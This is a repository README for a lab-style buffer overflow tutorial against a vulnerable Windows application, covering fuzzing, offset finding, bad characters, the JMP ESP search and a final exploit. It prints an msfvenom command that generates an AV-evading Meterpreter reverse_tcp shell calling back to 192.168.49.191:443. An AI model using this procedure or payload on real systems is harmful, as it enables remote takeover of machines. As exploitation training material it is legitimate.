# Classic-Buffer-Overflows<br/>

Python scripts needed to perform a buffer overflow from a previously known vulnerable application or proof of concept. There will also be a small description instructing how to use the files.<br/>
For this particular application I also use WinDbg to build out from the PoC to getting a meterpreter shell. <br/>
The naming covention I am using is as follows<br/>
SX[ShortDescription].py<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where SX is the step number, followed by a short description.<br/>
# \*\~\*\~\*\~\*\~Legal Disclaimer\~\*\~\*\~\*\~\*
These scripts are meant to be modified with the intent of hardcoding things like the ip and port number but that's just personal preference.<br/>
Feel free to do whatever you want to do with these scripts within the confines of the law.<br/>
You are solely responsible for your actions.<br/>
# \*\~\*\~\*\~\*\~Legal Disclaimer\~\*\~\*\~\*\~\*

## S1PoCFuzz.py
This is a fuzzer that sends an arbitrary amount of data to a web based application that causes a crash.<br/>
Usage: ./S1PoCFuzz.py {IP} {Port} {Data} <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where data is an interger that represents the number of bytes that cause a crash.<br/>
<br/>
In our WinDbg debugger we see that we have overwriten every register except the ESP using the r command. <br/>
We can see what the ESP register points to by using the following command:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dds esp<br/>
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S1Fuzz.png)<br/>

## S2FindOffset.py
This script along with our debugger will help us find offset that writes to the EIP.<br/>
First we generate an array of characters using the following command:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom-pattern_create l- {data}<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where data represents the number of bytes that caused the crash.<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Next we make sure to send the character array to the vulnerable application.<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is shown on line 16 of this script.<br/>
Usage ./S2FindOffset.py {IP} {Port}<br/>
<br/>
From our debugger, we see that the EIP is overwritten by 33794332
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S2EIP.png)<br/>
Next we find the offset that will overwrite the EIP by using the following command<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom-pattern_offset -l {data} -q {eip}<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; where -l {data} is the amount of data that caused the application to crash and -q {eip} is the area we want to overwrite.
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S2Offset.png)<br/>
## S3ChangeEIP.py
Now that we know where our EIP is, we want to verify it and find a suitable location for our reverse shell.<br/>
usage ./S3ChangeEIP.py {IP} {port} {offset}<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Where offset is the interger that obtained from the msfvenom-find_offset command<br/>
<br/>
In our WinDbg debugger we see that we have overwriten ESP with 42424242, or the hex representation of BBBB, using the r command. <br/>
We can see what the ESP register points to with the following command:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dds esp -14 L10<br/>
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S3EIPOverwrite.png)<br/>
This command shows us that our ESP is 041dee6c.<br/>
The lines before our ESP show us that there are some 41s and some 42s.<br/>
These 42s represent our EIP, but more importantly we see that our ESP points to 44s.<br/>
This is where our shellcode will go.<br/>
By changing the value of L 10 to something higher we can see more bytes after our ESP. <br/>
It is good practice to navigate to each register to see how the application handles data. <br/>
This can be important because some applications may not have enough memory for our shellcode.<br/>
I will cover a few strategies later to overcome this limitation.<br/>
## S4BadChars.py
Before we can generate our shellcode, we have to find what characters cause our attack to fail.<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usage S4BadChars.py {IP} {Port}<br/>
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S4BadChars.png)<br/>
using the command dds esp in WinDBg we can see the character array we sent to the application.<br/>
The nullbyte character (\x00) is omitted because its very likely to cause our attack to fail.<br/>
We are looking for characters that are out of place from 01 to ff.<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;An out of place character may look like 01 02 03 04 08 06 07 08<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In this case we would return to our python script remove 05 and make a note of it.<br/>
<br/>
We are also looking for characters that truncate the character array.<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Truncation looks like 97 98 99 9a 9b 9c 00 ff f3 5a<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Where 9d would need to be removed because 9c is the last character from our array.<br/>
<br/>
Fortunately, this application does not have bad characters other than 00.<br/>
However, it is very important to note what these bad characters are.<br/>
We repeat this until we verify each character in our array.<br/>
## Generating our Shellcode
Before we can generate our shellcode, we need to find a module that contains a jump instruction.<br/>
This jump instruction will help us jump to our shellcode.<br/>
To do this we will use a program called process hacker and find our vulnerable application.<br/>
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S4Modules.png)<br/>
The ideal module does not have any protection, meaning that the ASLR and CF Guard fields are blank.<br/>
When we find a potentially suitable module, we go to our debugger and find the address for our jump command.<br/>
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S4JMPESP.png)<br/>
The first command gives us the boundary of the module. This boundary limits our search scope for our jump command.<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm m vulnapp1<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where lm list the modules and m specifies a pattern that must match our query of vulnapp1.<br/>
The second command helps us achieve this.<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s -b 14800000 14816000 0xff 0xe4<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This command searches for ffe4 from 14800000 14816000 displaying the (-b)bytes.<br/>
In this case, since we are jumping to the ESP we are searching for jmp esp which is ff e4<br/>
But a different application might require a different jump code<br/>
Which are here for your convenience. <br/>
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S4JMPCodes.png)<br/>
Now we can generate out shellcode using the following command:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.191 LPORT=443 EXITFUNC=thread -f python ???e x86/shikata_ga_nai -b "\x00"<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where we use -p for the platform we are attacking and payload we are using<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXITFUNC=thread because we dont want to close the vulnerable app when we close the shell<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e x86/shikata_ga_nai to encode the shellcode to either evade AV or avoid bad characters<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-b lets you specify what the bad characters are.<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is shown below.<br/>
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S5GenerateShellcode.png)<br/>
## S5FinalBoF.py
Now we put everything together into this script and we get our code execution.<br/>
Usage ./S5FinalBoF.py {ip} {port} {offset}<br/>
Next we set up our listener and run this script.<br/>
If everything went well we should have code execution<br/>
Shown below is setting up the listener as well as proof of code execution...<br/>
![alt tag](https://github.com/ZeusBanda/Classic-Buffer-Overflows/blob/main/WinDbg-Images/S6ReverseShell.png)<br/>
